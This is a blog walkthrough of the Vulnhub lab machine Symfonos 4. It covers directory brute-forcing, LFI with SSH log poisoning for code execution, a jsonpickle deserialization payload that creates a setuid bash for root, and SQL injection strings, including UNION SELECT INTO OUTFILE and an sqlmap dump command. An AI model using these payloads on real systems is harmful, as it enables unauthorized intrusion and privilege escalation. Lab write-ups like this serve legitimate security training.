<!doctype html><html lang=en><head><title>Vulnhub: Symfonos 4 :: ikuamike</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/symfonos4/><link rel=stylesheet href=https://blog.ikuamike.io/assets/style.css><link rel=stylesheet href=https://blog.ikuamike.io/assets/green.css><link rel=stylesheet href=https://blog.ikuamike.io/style.css><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://blog.ikuamike.io/img/favicon/green.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnhub: Symfonos 4"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/symfonos4/"><meta property="og:site_name" content="ikuamike"><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-02-15 00:00:00 +0000 UTC"></head><body class=green><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Show more ▾</li><ul class="menu__sub-inner-more hidden"><li><a href=/webinars>Webinars</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/webinars>Webinars</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/symfonos4/>Vulnhub: Symfonos 4</a></h1><div class=post-meta><span class=post-date>2021-02-15</span></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/intermediate/>Intermediate</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/ffuf/>ffuf</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/directory-bruteforce/>Directory Bruteforce</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/lfi/>LFI</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/pickle/>Pickle</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/deserialization/>Deserialization</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/sqli/>SQLi</a>&nbsp;</span><div class=post-content><div><img src=/img/symfonos1/symfonos1.png alt=symfonos class=center style=border-radius:8px><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th></tr></thead><tbody><tr><td>Intermediate</td><td>20 Aug 2019</td><td>Zayotic</td></tr></tbody></table><h1 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h1><p>For this box, some directory bruteforce is needed to discover some php files. One of the php files has an lfi
vulnerability but can only be access by authenticating to the other page. The login form can be bypassed and
we exploit the lfi. For that we poison ssh logs for exploitation to rce. For privilege escalation we exploit
a python web app running locally as root using insecure deserialization of the cookie by jsonpickle.</p><h1 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Nmap</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.105
Host is up <span style=color:#f92672>(</span>0.00033s latency<span style=color:#f92672>)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian <span style=color:#ae81ff>10</span> <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey:
|   <span style=color:#ae81ff>2048</span> f9:c1:73:95:a4:17:df:f6:ed:5c:8e:8a:c8:05:f9:8f <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> be:c1:fd:f1:33:64:39:9a:68:35:64:f9:bd:27:ec:01 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> 66:f7:6a:e8:ed:d5:1d:2d:36:32:64:39:38:4f:9c:8a <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
80/tcp open  http    Apache httpd 2.4.38 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
|_http-server-header: Apache/2.4.38 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title <span style=color:#f92672>(</span>text/html<span style=color:#f92672>)</span>.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=http-80>HTTP (80)<a href=#http-80 class=hanchor arialabel=Anchor>&#8983;</a></h2><p>On the browser, the only thing that is served is an image. Therefore we need to bruteforce for directories
and files.</p><img src=/img/symfonos4/symfonos4-26.png alt=symfonos class=center style=border-radius:8px><p>Performing a bruteforce with ffuf we get a <strong>gods</strong> directory.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>ffuf -ic -c -u http://192.168.56.105/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e / -fc <span style=color:#ae81ff>403</span> | tee root.ffuf
</code></pre></div><img src=/img/symfonos4/symfonos4-2.png alt=symfonos class=center style=border-radius:8px><p>In this directory we only have some files, with nothing useful in them.</p><img src=/img/symfonos4/symfonos4-1.png alt=symfonos class=center style=border-radius:8px><p>The contents:</p><img src=/img/symfonos4/symfonos4-3.png alt=symfonos class=center style=border-radius:8px><p>I decided to use the contents of the files to generate a wordlist for more bruteforce using curl.</p><img src=/img/symfonos4/symfonos4-4.png alt=symfonos class=center style=border-radius:8px><p>With this new words I performed bruteforce again but adding extensions.</p><img src=/img/symfonos4/symfonos4-6.png alt=symfonos class=center style=border-radius:8px><p>From this we discover <strong>sea.php</strong> .</p><p>When we try to visit this file, we get redirected to atlantis.php which has a login form.</p><img src=/img/symfonos4/symfonos4-7.png alt=symfonos class=center style=border-radius:8px><p>On this form if we submit random creds, then visit sea.php afterwards. We are able to access it. I think this
behaviour is related to the cookies the app sends after trying to login.</p><p>The sea.php has form that loads files based on the god we select. The contents are the log files we discovered
in /gods. Based on this behaviour we can try and exploit lfi to get rce.</p><img src=/img/symfonos4/symfonos4-10.png alt=symfonos class=center style=border-radius:8px><p>Since the on the url we are passing hades, and it loads content of hades.log. We can assume it appends .log
to our input. This restricts us to only loading log files, but that should be sufficient for lfi to rce.</p><p>After testing a few log files I could only access auth.log which is located in /var/log/auth.log. These are ssh logs.</p><h1 id=getting-shell-as-www-data>Getting shell as www-data<a href=#getting-shell-as-www-data class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Let&rsquo;s poison the ssh log by add php code in the username for rce.</p><img src=/img/symfonos4/symfonos4-12.png alt=symfonos class=center style=border-radius:8px><p>We can pass the command id to test if we were successful.</p><img src=/img/symfonos4/symfonos4-13.png alt=symfonos class=center style=border-radius:8px><p>In the response we have www-data output. Now we can send our reverse shell payload.</p><img src=/img/symfonos4/symfonos4-14.png alt=symfonos class=center style=border-radius:8px><p>Shell:</p><img src=/img/symfonos4/symfonos4-15.png alt=symfonos class=center style=border-radius:8px><p>In the webroot we can read atlantis.php that had the login form and here we get db creds.</p><img src=/img/symfonos4/symfonos4-16.png alt=symfonos class=center style=border-radius:8px><p>The discovered password is also the password for the poseidon user.</p><img src=/img/symfonos4/symfonos4-17.png alt=symfonos class=center style=border-radius:8px><h1 id=privilege-escalation>Privilege Escalation<a href=#privilege-escalation class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Performing some manual enumeration locally for privesc paths, I took a look at local listening services. I
discovered port 8080 which I used ssh portforwarding to access from my host.</p><img src=/img/symfonos4/symfonos4-19.png alt=symfonos class=center style=border-radius:8px><p>A simple web app is running.</p><img src=/img/symfonos4/symfonos4-18.png alt=symfonos class=center style=border-radius:8px><p>Looking back at running processes, this appears to be a python app which is running as root. Looks like this is our
path to privesc.</p><img src=/img/symfonos4/symfonos4-21.png alt=symfonos class=center style=border-radius:8px><p>In /opt I found the source code:</p><img src=/img/symfonos4/symfonos4-20.png alt=symfonos class=center style=border-radius:8px><p>Based on the use of pickle, we need to exploit deserialization through the cookie.</p><p>I came up with the below script to generate a base64 encoded cookie which when deserialized
will create a setuid binary of bash.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=color:#f92672>import</span> jsonpickle
<span style=color:#f92672>import</span> base64
<span style=color:#f92672>import</span> os

<span style=color:#66d9ef>class</span> <span style=color:#a6e22e>RCE</span>(object):
    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
        cmd <span style=color:#f92672>=</span> (<span style=color:#e6db74>&#39;cp /bin/bash /tmp/suidbash;chmod +s /tmp/suidbash&#39;</span>)
        <span style=color:#66d9ef>return</span> os<span style=color:#f92672>.</span>system, (cmd,)

encoded <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(jsonpickle<span style=color:#f92672>.</span>encode(RCE()))
<span style=color:#66d9ef>print</span>(encoded)
</code></pre></div><img src=/img/symfonos4/symfonos4-22.png alt=symfonos class=center style=border-radius:8px><p>Setting the cookie and sending the request using burpsuite:</p><img src=/img/symfonos4/symfonos4-23.png alt=symfonos class=center style=border-radius:8px><p>We get suidbash</p><img src=/img/symfonos4/symfonos4-24.png alt=symfonos class=center style=border-radius:8px><p>And we finally get a root shell:</p><img src=/img/symfonos4/symfonos4-25.png alt=symfonos class=center style=border-radius:8px><h1 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=checking-the-redirect-on-accessing-the-seaphp>Checking the redirect on accessing the sea.php.<a href=#checking-the-redirect-on-accessing-the-seaphp class=hanchor arialabel=Anchor>&#8983;</a></h2><p>The code on sea.php only checks if the session isset but not what value it is set to. From atlantis.php when you send wrong creds,
the <code>$_SESSION['logged_in']</code> is set to false.</p><img src=/img/symfonos4/symfonos4-27.png alt=symfonos class=center style=border-radius:8px><h2 id=sql-injection-on-atlantisphp-login-form>SQL Injection on atlantis.php login form.<a href=#sql-injection-on-atlantisphp-login-form class=hanchor arialabel=Anchor>&#8983;</a></h2><p>When you supply username <code>admin' or 1=1-- -</code> and a random password we get a redirect to sea.php but with
<code>admin' and 1=2-- -</code> we get a incorrect login.</p><p>This is a blind boolean sql injection. We can intercept the request with burpsuite and save the request to file
and exploit this with sqlmap.</p><img src=/img/symfonos4/symfonos4-28.png alt=symfonos class=center style=border-radius:8px><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>sqlmap -r atlantis.req --batch --dump --level<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span> --risk<span style=color:#f92672>=</span><span style=color:#ae81ff>3</span> --threads<span style=color:#f92672>=</span><span style=color:#ae81ff>5</span>
</code></pre></div><p>I was able to dump creds but they weren&rsquo;t useful as I couldn&rsquo;t crack the hash.</p><img src=/img/symfonos4/symfonos4-11.png alt=symfonos class=center style=border-radius:8px><p>Since we can run sql queries, we can try and write to a file and access it using the lfi. During exploiting of this box
I tried this but couldn&rsquo;t figure out why it failed but on revisiting it afterwards I figured out the issue.</p><p>Using this payload in my post request to write to a file using select, we don&rsquo;t get the usual redirect that
signifies that the query was successful.</p><pre><code>username=admin' and 1=2 Union Select 1,'2' INTO OUTFILE '/tmp/test.log'-- -&amp;password=a
</code></pre><img src=/img/symfonos4/symfonos4-29.png alt=symfonos class=center style=border-radius:8px><p>The file is actually written to disk if we check the /tmp folder.</p><img src=/img/symfonos4/symfonos4-30.png alt=symfonos class=center style=border-radius:8px><p>The reason that we don&rsquo;t get a redirect is that no rows are returned by the query when writing files therefore
the php code returns a false and doesn&rsquo;t redirect to sea.php.</p><img src=/img/symfonos4/symfonos4-31.png alt=symfonos class=center style=border-radius:8px><p>Now if we try to include the test.log in /tmp using the lfi, it fails. The reason for this is because some services are
configured to have a private tmp folder which isn&rsquo;t the same as the usual /tmp. The below answer I found explains this.</p><img src=/img/symfonos4/symfonos4-32.png alt=symfonos class=center style=border-radius:8px><p>If you look at the previous screenshot you&rsquo;ll notice the folders beginning with systemd-private and one of those seem to
belong to apache2.</p><p>With this knowledge, we need to use other directories to write files in. Since we are exploiting sql injection for this,
we need folders that the mysql user can write. I discovered /var/lib/mysql and /dev/shm are suitable for this.</p><p>Something else to note is that if a file exists, sql will not overwrite it. Therefore if you need to make changes to
what you&rsquo;re writing you&rsquo;ll need to write to another non-existent file.</p><p>Testing this using /var/lib/mysql the file gets written.</p><pre><code>username=admin' and 1=2 Union Select 1,'test' INTO OUTFILE '/var/lib/mysql/123456.log'-- -&amp;password=a
</code></pre><img src=/img/symfonos4/symfonos4-33.png alt=symfonos class=center style=border-radius:8px><p>Then accessing it using the lfi works this time.</p><img src=/img/symfonos4/symfonos4-34.png alt=symfonos class=center style=border-radius:8px><p>Something else also to note is that the db user in this case is the mysql root user.</p></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/symfonos5/><span class=button__icon>←</span>
<span class=button__text>Vulnhub: Symfonos 5</span></a></span>
<span class="button next"><a href=https://blog.ikuamike.io/posts/2021/symfonos3/><span class=button__text>Vulnhub: Symfonos 3</span>
<span class=button__icon>→</span></a></span></div></div></div><script src=https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js></script><script>addBackToTop({diameter:40,backgroundColor:'rgb(120, 226, 160)',textColor:'#1F222A',cornerOffset:30})</script></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>© Michael Ikua</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://blog.ikuamike.io/assets/main.js></script><script src=https://blog.ikuamike.io/assets/prism.js></script></div></body></html>